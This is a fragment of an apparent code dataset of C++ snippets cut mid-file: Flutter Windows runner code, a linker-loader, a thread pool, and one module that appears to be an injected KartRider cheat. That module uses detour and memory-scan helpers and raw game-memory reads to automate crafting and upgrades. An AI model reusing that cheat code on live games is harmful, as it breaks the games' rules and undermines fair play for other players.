nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <map>\n#include <vector>\n#include <string>\n#include <algorithm>\n#include <fstream>\n#include <sstream>\n#include <iomanip>\n#include <set>\nusing namespace std;\ntypedef long long int li;\n#define rep(i, a, b) for (int i = a; i < b; i++)\n\nint programAddress, lastAddress;        // program and last address\nvector<string> memory((1 << 18), \"xx\"); // memory vector initialized with xx\nmap<string, int> externalSymbolTable;   // external symbol table\n\nvoid passOneOfLinkerLoader(string input)\n{\n    ifstream inputFileReader(input);\n\n    // check if file is successfully opened\n    if (!inputFileReader.is_open())\n    {\n        perror(\"error in reading the input file in passOneOfLinkerLoader\");\n        exit(1);\n    }\n\n    // ask user for the address of the program\n    cout << \"Enter programAddress for the program: \";\n    string addressForProgram;\n    cin >> addressForProgram;\n\n    programAddress = stoi(addressForProgram, nullptr, 16); // set programAddress to the input hexadecimal value\n    int controlSectionAddress = programAddress, controlSectionLength = 0;\n    string record = \"\";\n\n    // read all records till the end of file\n    while (getline(inputFileReader, record))\n    {\n        // break loop on reaching end of file\n        if (record.empty())\n            break;\n\n        // Process Header records\n        if (record.front() == 'H')\n        {\n            controlSectionAddress = controlSectionAddress + controlSectionLength;\n            string controlSection = record.substr(1, 6);\n            controlSectionLength = stoi(record.substr(13, 6), nullptr, 16);\n\n            if (externalSymbolTable.find(controlSection) == externalSymbolTable.end())\n                externalSymbolTable.insert({controlSection, controlSectionAddress}); // Insert controlSection and controlSectionAddress into ESTAB if not already present\n            else\n            {\n                perror(\"duplicate external symbol\"); // error message\n                exit(1);\n            }\n        }\n\n        // Process Define records\n        if (record.front() == 'D')\n        {\n            vector<pair<string, int>> symbols;\n            int n = record.length(), ite = 1;\n            while (ite < n)\n            {\n                symbols.push_back(make_pair(record.substr(ite, 6), stoi(record.substr(ite + 6, 6), nullptr, 16)));\n                ite = ite + 12;\n            }\n            for (int ite = 0; ite < symbols.size(); ite++) // iterating through all the symbols\n            {\n                auto symbol = symbols[ite];\n                // symbols from Define records are added them to ESTAB\n                if (externalSymbolTable.find(symbol.first) != externalSymbolTable.end())\n                {\n                    perror(\"The external symbol is a duplicate.\");\n                    exit(1);\n                }\n                else\n                    externalSymbolTable.insert({symbol.first, symbol.second + controlSectionAddress});\n            }\n        }\n    }\n    lastAddress = controlSectionAddress + controlSectionLength; // Update LAST with the end address of the program\n}\n\n// Function to remove blank spaces from a string\nstring removeBlankSpaces(string s)\n{\n    string ans = \"\";\n    li n = s.length();\n    rep(i, 0, n) if (s[i] != ' ')\n        ans += s[i];\n    return ans;\n}\n// Function to convert a number to hexadecimal string\nstring numberToHexaDecimal(int num)\n{\n    stringstream ss;\n    ss << hex << num;\n    return ss.str();\n}\n\n// Function to format a number to a desired width with a specified filler character\nstring numberFormatter(int actualNumber, int desiredWidth, char filler = '0')\n{\n    stringstream t;\n    t << hex << uppercase;\n    string str = numberToHexaDecimal(actualNumber);\n    int k = str.length();\n    rep(i, 0, desiredWidth - k) t << filler;\n    t << actualNumber;\n    string desiredString = t.str();\n    return desiredString;\n}\n\n// Function to format a string to a desired width with a specified padding character\nstring stringFormatter(string name, int desiredWidth, char pad = ' ')\n{\n    string ans = \"\";\n    int n = name.length();\n    int k = desiredWidth - n;\n    ans += name;\n    while (k > 0)\n    {\n        ans += pad;\n        k--;\n    }\n    return ans;\n}\n\nvoid passTwoOfLinkerLoader(string input)\n{\n    ifstream inputFileReader(input);\n    // inputFileReader.open(input, ios::in);\n\n    // Check if input file is successfully opened\n    if (!inputFileReader.is_open())\n    {\n        perror(\"can't open the input file in passTwoOfLinkerLoader\"); //  error message\n        exit(1);                                                      // terminate program\n    }\n    int controlSectionAddress = programAddress, EXECADDR = programAddress, controlSectionLength = 0;\n    string record = \"\";\n\n    // Read records from the input file until end of file\n    while (getline(inputFileReader, record))\n    {\n        // Break loop if end of file is reached\n        if (record.empty())\n            break;\n\n        // process header records\n        if (reco",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"whatsapp_clone\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff\n#include \"../struct.h\"\n#include \"../resource.h\"\n#include \"../helper/DbgPrint.h\"\n#include \"../KartRider.hpp\"\n#include \"../helper/detoursHlper.hpp\"\n#include \"../helper/aobscan/aobscan.hpp\"\n\n\n\n#define DbgPrint2\n// #define DbgPrint2 MyDbgPrintFun\n\nextern HWND g_GamehWnd;\nextern HMODULE g_hModule;\nextern HMODULE g_hModule;\nextern DWORD g_BaseAddress;\nextern DWORD g_BaseAddress1;\nextern LPCDLGTEMPLATEW pDlgtmp_Dialog_Exchange;\n\nnamespace ExchangeSystem\n{\n\tHWND hDlg;\n\tHWND hGameWnd;\n\tHWND hWnd_combox_carnum;\n\tHWND hWnd_combox_lucky;\n\tHWND hWnd_edit_carnum;\n\tHWND hWnd_edit_lockpage;\n\tHWND hWnd_edit_delay;\n\tHWND hWnd_edit_addcar_name;\n\tHWND hWnd_edit_addcar_code;\n\n\tHWND hWnd_list_filter;\n\tHWND hWnd_check_begin;\n\tHWND hWnd_check_lucky;\n\tHWND hWnd_check_cchresult;\n\tHWND hWnd_check_showcarnum;\n\tHWND hWnd_check_lockpage;\n\tHWND hWnd_check_filter;\n\tHWND hWnd_check_filter_show;\n\tHWND hWnd_check_filter_Engine_V1;\n\tHWND hWnd_check_filter_Engine_X;\n\tHWND hWnd_check_filter_Engine_9;\n\tHWND hWnd_check_filter_Engine_HTNew;\n\tHWND hWnd_check_filter_Engine_HT;\n\tHWND hWnd_check_filter_Engine_Z7;\n\tHWND hWnd_check_filter_Engine_SR;\n\tHWND hWnd_check_filter_Engine_PRO;\n\tHWND hWnd_check_filter_attribute_red;\n\tHWND hWnd_check_filter_attribute_gold;\n\tHWND hWnd_check_filter_attribute_purple;\n\tHWND hWnd_check_filter_attribute_white;\n\tHWND hWnd_check_filter_upcar;\n\n\tHWND hWnd_check_kartup;\n\tHWND hWnd_check_kartup_showcarnum;\n\tHWND hWnd_check_kartup_lucky;\n\tHWND hWnd_check_kartup_lockpage;\n\tHWND hWnd_combox_kartup_lucky;\n\tHWND hWnd_edit_kartup_carnum;\n\tHWND hWnd_edit_kartup_lockpage;\n\tHWND hWnd_edit_kartup_delay;\n\tHWND hWnd_check_disasse_kart;\n\tHWND hWnd_check_disasse_lockpage;\n\tHWND hWnd_check_disasse_shownum;\n\tHWND hWnd_edit_disasse_carnum;\n\tHWND hWnd_edit_disasse_page;\n\tHWND hWnd_edit_disasse_delay;\n\n\tHWND hWnd_edit_log;\n\n\tDWORD ExchangeSystemDialog;\n\tDWORD DisassembleStage;\n\tDWORD PrKartLevelUp;\n\tDWORD oldPrKartLevelUp;\n\tDWORD KartLevelUpDialog;\n\tDWORD KartLevelUpResultDialog;\n\tDWORD KartLevelUpResultDialog_animati;\n\n\tDWORD \u5408\u6210\u8ba1\u6570 = 0;\n\tDWORD \u53d6\u8f66\u5b50\u5f15\u64ce\u53c2\u6570;\n\tDWORD \u53d6\u8f66\u5b50\u5f15\u64ce\u51fd\u6570;\n\tDWORD \u53d6\u7269\u54c1\u540dcall;\n\n\tDWORD \u5408\u6210\u7ed3\u679c\u5730\u5740;\n\tDWORD \u5408\u6210\u7ed3\u679c\u5730\u57401;\n\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f86;\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c;\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f86\u5b8c\u6bd5;\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f86\u5b8c\u6bd51;\n\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f861;\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c1;\n\n\tDWORD \u53d6\u8f66\u5b50\u5347\u7ea7\u4fe1\u606f;\n\tDWORD \u53d6\u8f66\u5b50\u5347\u7ea7\u4fe1\u606f\u53c2\u6570;\n\n\tDWORD \u5408\u6210_\u8fc7\u6389\u786e\u8ba4\u6846;\n\tDWORD64 \u5408\u6210_\u8fc7\u6389\u786e\u8ba4\u6846\u539f\u59cb\u6570\u636e;\n\tDWORD \u5408\u6210_\u7ffb\u9875CALL;\n\tDWORD \u5408\u6210_\u5224\u65ad\u8f66\u5b50;\n\tDWORD \u5408\u6210_\u5224\u65ad\u8f66\u5b50\u8df3\u8f6c;\n\tDWORD \u5408\u6210_\u5f00\u59cb\u5408\u6210;\n\tDWORD \u5408\u6210_\u5f00\u59cb\u5408\u6210\u8df3\u8f6c;\n\tDWORD \u5408\u6210_\u8f66\u5b50\u504f\u79fb;\n\tDWORD \u5408\u6210_\u9875\u6570\u504f\u79fb;\n\tDWORD \u5408\u6210_\u9501\u5b9a\u5408\u6210\u8f66\u5b50\u6570;\n\tDWORD \u5408\u6210_\u52a8\u753b\u901f\u5ea6;\n\n\tDWORD \u5347\u7ea7_\u7981\u6b62\u5220\u9664\u5f85\u5347\u7ea7\u8f66\u8f86;\n\tDWORD \u5347\u7ea7_\u8fc7\u6ee4\u8f66\u5b50;\n\tDWORD \u5347\u7ea7_\u8fc7\u6ee4\u8f66\u5b50\u8df3\u8f6c;\n\tDWORD \u5347\u7ea7_\u8fc7\u6ee4\u8f66\u5b50\u5b8c\u6bd5;\n\tDWORD \u5347\u7ea7_\u63d0\u9ad8\u5e78\u8fd0\u70b9;\n\n\tDWORD \u6539\u88c5_\u8fc7\u6ee4\u8f66\u8f86;\n\tDWORD \u6539\u88c5_\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c;\n\tDWORD \u52a0\u70b9_\u8fc7\u6ee4\u8f66\u8f86;\n\tDWORD \u52a0\u70b9_\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c;\n\tDWORD \u90e8\u4ef6_\u8fc7\u6ee4\u8f66\u8f86;\n\tDWORD \u90e8\u4ef6_\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c;\n\n\tDWORD \u5206\u89e3_\u8fc7\u6ee4\u8f66\u8f86;\n\tDWORD \u5206\u89e3_\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c;\n\tDWORD \u5206\u89e3_\u8fc7\u6ee4\u8f66\u8f86\u5b8c\u6bd5;\n\tDWORD \u5206\u89e3_\u7981\u7528\u64a4\u9500;\n\tDWORD \u5206\u89e3_\u8df3\u8fc7\u5206\u89e3\u52a8\u753b;\n\tDWORD \u5206\u89e3_\u5269\u4f59\u8ba1\u6570\u504f\u79fb;\n\tDWORD \u5206\u89e3_\u8df3\u8fc7\u4fe1\u606f\u63d0\u793a;\n\tDWORD \u5206\u89e3_\u8df3\u8fc7\u4fe1\u606f\u63d0\u793a_\u624b\u7eed\u8d39;\n\n\tstruct kartupslot\n\t{\n\t\tDWORD garagecard;\n\t\tDWORD itemkart;\n\n\t} kartupslotinfo;\n\n\tstruct Filtercar\n\t{\n\t\tBOOL Filter_upcar;\n\t\tBOOL Filter_V1;\n\t\tBOOL Filter_X;\n\t\tBOOL Filter_9;\n\t\tBOOL Filter_HTNew;\n\t\tBOOL Filter_HT;\n\t\tBOOL Filter_Z7;\n\t\tBOOL Filter_SR;\n\t\tBOOL Filter_PRO;\n\t\tBOOL Filter_ultimate;\n\t\tBOOL Filter_rare;\n\t\tBOOL Filter_advanced;\n\t\tBOOL Filter_general;\n\t\tBOOL Filter_listhide;\n\t\tBOOL Filter_listshow;\n\t} g_Filtercar = {FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE};\n\n\tHANDLE hThread_Exchange;\n\tHANDLE hThread_kartlevelup;\n\tHANDLE hThread_disasse;\n\n\ttypedef struct _ExchangeData\n\t{\n\t\tint \u6bcf\u6b21\u5408\u6210\u8f66\u5b50\u6570\u91cf;\n\t\tint \u5e78\u8fd0\u503c;\n\t\tbool \u5224\u65ad\u5408\u6210\u7ed3\u679c;\n\t\tint \u5217\u8868\u8f66\u5b50\u6570\u91cf;\n\t\tint \u9501\u5b9a\u9875\u6570;\n\t\tint \u5ef6\u65f6;\n\t\tBOOL \u5f00\u59cb\u542f\u52a8;\n\t\tint \u8f66\u5b50\u8ba1\u6570;\n\t\tint \u679a\u4e3e\u6570\u91cf;\n\t} ExchangeData;\n\ttypedef struct _\u5408\u6210\u5750\u6807\u4fe1\u606f\n\t{\n\t\tPOINT \u8f66\u8f86\u663e\u793a\u5750\u6807;\n\t\tPOINT \u5f00\u59cb\u5408\u6210\u5750\u6807;\n\t\tPOINT \u901a\u7528\u662f\u5426\u5750\u6807;\n\t\tPOINT \u5408\u6210\u786e\u5b9a\u5750\u68071;\n\t\tPOINT \u5408\u6210\u786e\u5b9a\u5750\u68072;\n\t\tPOINT \u5347\u7ea7\u5f00\u59cb\u5750\u6807;\n\t\tPOINT \u5347\u7ea7\u786e\u5b9a\u5750\u6807;\n\t\tPOINT \u5206\u89e3\u5f00\u59cb\u5750\u6807;\n\n\t} \u5408\u6210\u5750\u6807\u4fe1\u606f;\n\n\t\u5408\u6210\u5750\u6807\u4fe1\u606f \u5408\u6210\u5750\u6807;\n\tExchangeData ed;\n\tstd::vector<POINT> \u5750\u6807\u6570\u7ec4;\n\tstd::vector<POINT> \u5206\u89e3\u5750\u6807\u6570\u7ec4;\n\n\tstd::vector<DWORD> \u8fc7\u6ee4\u8f66\u5b50\u5217\u8868;\n\n\tvoid \u5f00\u59cb\u505c\u6b62\u5408\u6210(BOOL status);\n\tvoid \u5f00\u59cb\u505c\u6b62\u8f66\u8f86\u5347\u7ea7(BOOL status);\n\n\tHWND WINAPI GetGameHwnd()\n\t{\n\t\tHWND result = 0;\n\t\tWCHAR classNam[MAX_PATH];\n\t\tmemset(classNam, 0, sizeof(classNam));\n\t\tDWORD ProcessId = 0;\n\t\tfor (HWND hWnd = FindWindowEx(0, 0, nullptr, nullptr);\n\t\t\t hWnd != 0;\n\t\t\t hWnd = FindWindowEx(0, hWnd, nullptr, nullptr))\n\t\t{\n\t\t\tGetWindowThreadProcessId(hWnd, &ProcessId);\n\t\t\tif (ProcessId == GetCurrentProcessId())\n\t\t\t{\n\t\t\t\tGetClassName(hWnd, classNam, MAX_PATH * sizeof(WCHAR));\n\t\t\t\tif (lstrcmpi(classNam, L\"PopKart Client\") == 0 ||\n\t\t\t\t\tlstrcmpi(classNam, L\"KartRider Client\") == 0 ||\n\t\t\t\t\tlstrcmpi(classNam, L\" Client\") == 0)\n\t\t\t\t\tresult = hWnd;\n\t\t\t}\n\t\t}\n\t\treturn result;\n\t}\n\n\tDWORD __stdcall getgamestage(DWORD base)\n\t{\n\t\tDWORD result = 0;\n\t\ttry\n\t\t{\n\t\t\tresult = *reinterpret_cast<DWORD *>(*reinterpret_cast<DWORD *>(base));\n\t\t}\n\t\tcatch (...)\n\t\t{\n\t\t}\n\t\treturn result;\n\t}\n\n\tSHORT __stdcall getupkartcode(DWORD base, DWORD garagecard, DWORD itemkart, DWORD type)\n\t{\n\t\tSHORT result = 0;\n\t\ttry\n\t\t{\n\t\t\tauto gc = *reinterpret_cast<DWORD *>(*reinterpret_cast<DWORD *>(base) + garagecard + (type == 1 ? 0 : 4));\n\t\t\tif (gc != 0)\n\t\t\t{\n\t\t\t\tauto ik = *reinterpret_ca",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\ufeff// ThreadPool.cpp : \u6b64\u6587\u4ef6\u5305\u542b \"main\" \u51fd\u6570\u3002\u7a0b\u5e8f\u6267\u884c\u5c06\u5728\u6b64\u5904\u5f00\u59cb\u5e76\u7ed3\u675f\u3002\n//\n\n#include <iostream>\n#include<functional>\n\n#include\"threadpool.h\"\n\nconst int TASKQUE_MAX_THRESHOLD = 1024;\nconst int THREAD_MAX_THRESHHOLD = 10;\nconst int THREAD_MAX_IDLE_TIME = 10;\n//\u4efb\u52a1\u7c7b\u65b9\u6cd5\nTask::Task()\n    :result_(nullptr)\n{}\nTask::~Task()\n{}\nAny Task::run()\n{\n    std::cout << \"\u4efb\u52a1\u6267\u884c\" << std::endl;\n    return \"aa\";\n}\nvoid Task::exec()\n{\n    if (result_ != nullptr)\n    {\n        result_->setVal(run()); //\u6267\u884c\u4efb\u52a1\uff0c\u4efb\u52a1\u7ed3\u679c\u653e\u5165result\u5bf9\u8c61\u4e2d\n    }\n}\nvoid Task::setResult(Result* result)\n{\n    result_ = result;\n}\n\n//\u6784\u9020\u51fd\u6570\nThreadPool::ThreadPool()\n    :initThreadSize_(4)\n    , taskSize_(0)\n    , taskQueMaxThreshold_(TASKQUE_MAX_THRESHOLD)\n    ,threadMaxThreshHold_(THREAD_MAX_THRESHHOLD)\n    , mode_(MODE_FIXED)\n    , isRunning(true)\n    ,idleThreadSize_(0)\n    ,curThreadSize_(0)\n{}\n//\u6790\u6784\u51fd\u6570\nThreadPool::~ThreadPool()\n{\n    //\u6ca1\u6709new\u5c31\u4e0d\u7528\u6790\u6784\n    isRunning = false;\n    notEmpty.notify_all();\n   // \u7b49\u5f85\u6240\u6709\u4efb\u52a1\u8fd4\u56de \uff0c\u6709\u4e24\u79cd\u72b6\u6001\uff0c\u963b\u585e&\u6267\u884c\u4e2d\n    std::unique_lock<std::mutex> lock(taskQueMtx);\n    exitable.wait(lock, [&]()->bool {return _threads.size() == 0; });\n\n}\n//\u8bbe\u7f6e\u4efb\u52a1\u961f\u5217\u6700\u5927\u9608\u503c\nvoid ThreadPool::setTaskQueMaxThreshold(int maxThreshold)\n{\n    if (checkRunningState()) {\n        return;\n    }\n\ttaskQueMaxThreshold_ = maxThreshold;\n}\n//\u8bbe\u7f6e\u7ebf\u7a0b\u6570\u91cf\u6700\u5927\u9608\u503c\nvoid ThreadPool::setThreadMAxThreshold(int maxThreshold) {\n    if (checkRunningState()) {\n        return;\n    }\n    if(mode_ == PoolMode::MODE_FIXED) threadMaxThreshHold_ = maxThreshold;\n}\n//\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u6a21\u5f0f\nvoid ThreadPool::setPoolMode(PoolMode mode)\n{\n    if (isRunning == true) {\n        mode_ = mode;\n    }\n\t\n}\n\nbool ThreadPool::checkRunningState() const {\n    return isRunning;\n}\n\n//\u5411\u4efb\u52a1\u961f\u5217\u4e2d\u63d0\u4ea4\u4efb\u52a1\nResult ThreadPool::submitTask(std::shared_ptr<Task> task)\n{\n    std::unique_lock<std::mutex> lock(taskQueMtx);\n    if (Taskque.size() >= taskQueMaxThreshold_)\n    {\n        if (notFull.wait_for(lock, std::chrono::seconds(1))==std::cv_status::timeout )\n        {\n\t\t\tstd::cout << \"\u4efb\u52a1\u961f\u5217\u5df2\u6ee1\uff0c\u63d0\u4ea4\u4efb\u52a1\u5931\u8d25\" << std::endl;\n      \n            return Result(task,false);\n\t\t}\n\t}\n    Taskque.push(task);\n    taskSize_++;\n    \n    //return task->getResult();//\u8fd9\u79cd\u662fResult\u5bf9\u8c61\u662f\u5c5e\u4e8etask\u7684\uff0ctask\u5728\u88ab\u7ebf\u7a0b\u6267\u884c\u5b8c\u6bd5\u540e\u4f1a\u88ab\u91ca\u653e\n                                            //\u8fd9\u79cd\u4e0d\u884c\uff0c\u5728task\u6790\u6784\u65f6\uff0c\u4f1a\u91ca\u653eresult\u5bf9\u8c61\uff0c\u5bfc\u81f4result\u5bf9\u8c61\u88ab\u91ca\u653e\n    if (mode_ == PoolMode::MODE_CACHED\n        && taskSize_ > idleThreadSize_\n        && curThreadSize_ < threadMaxThreshHold_) \n    {\n        auto ptr = std::make_unique<Thread>(std::bind(&ThreadPool::ThreadFunc, this,std::placeholders::_1));\n        int threadID = ptr->getThreadID();\n        _threads.emplace(threadID,std::move(ptr));\n        _threads[threadID]->start();\n        curThreadSize_++;\n        idleThreadSize_++;\n    }\n    notEmpty.notify_one();\n    return Result(task,true);//\u8fd9\u79cd\u662fResult\u5bf9\u8c61\u662f\u5c5e\u4e8eThreadPool\u7684\uff0c\u4e0d\u4f1a\u88ab\u91ca\u653e\n    \n}\n\n//\u542f\u52a8\u7ebf\u7a0b\u6c60\nvoid ThreadPool::start(size_t initThreadSize)\n{\n    //\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u521d\u59cb\u8fd0\u884c\u72b6\u6001\n    isRunning = true;\n    //\u8bbe\u7f6e\u521d\u59cb\u7ebf\u7a0b\u4e2a\u6570\n    initThreadSize_ = initThreadSize;\n    curThreadSize_ = initThreadSize;\n\t//\u521b\u5efa\u7ebf\u7a0b\n    for (size_t i = 0; i < initThreadSize_; i++)\n    {\n       \n        auto ptr = std::make_unique<Thread>(std::bind(&ThreadPool::ThreadFunc, this, std::placeholders::_1));\n        std::cout << \"threadid:\" << ptr->getThreadID() << \"create()\" << std::endl;\n        int threadId = ptr->getThreadID();\n\t\t//_threads.push_back(std::move(ptr));\n        _threads.emplace(threadId, std::move(ptr));\n\t}\n    //\u542f\u52a8\u7ebf\u7a0b\n    for (size_t i = 0; i < initThreadSize_; i++)\n    {\n\t\t_threads[i]->start();\n        //\u8bbe\u7f6e\u7a7a\u95f2\u7ebf\u7a0b\u7684\u6570\u91cf\n        idleThreadSize_ ++;\n\t}\n}\nint Thread::generatedId_ = 0;\nvoid ThreadPool::ThreadFunc(int threadid)\n{\n    auto lastTime = std::chrono::high_resolution_clock().now();\n    std::cout << \"ThreadFunc\u51fd\u6570\u5f00\u59cb\u6267\u884c,\u672c\u7ebf\u7a0b\u53f7\u4e3a\"<<std::this_thread::get_id() <<\"\\n\" << std::endl;\n    std::cout << \"\u73b0\u5728\u6709\" << this->curThreadSize_<<\"\u4e2a\u7ebf\u7a0b\" << \"\\n\" << std::endl;\n\n    while (isRunning == true)\n    {\n\t\tstd::shared_ptr<Task> task;\n\n        //\u6b64\u5904\u4ee3\u7801\u5757\u7528\u4e8e\u51cf\u5c0f\u9501\u7684\u4f5c\u7528\u57df\uff0c\u63d0\u9ad8\u6548\u7387\n        {\n            std::unique_lock<std::mutex> lock(taskQueMtx);\n            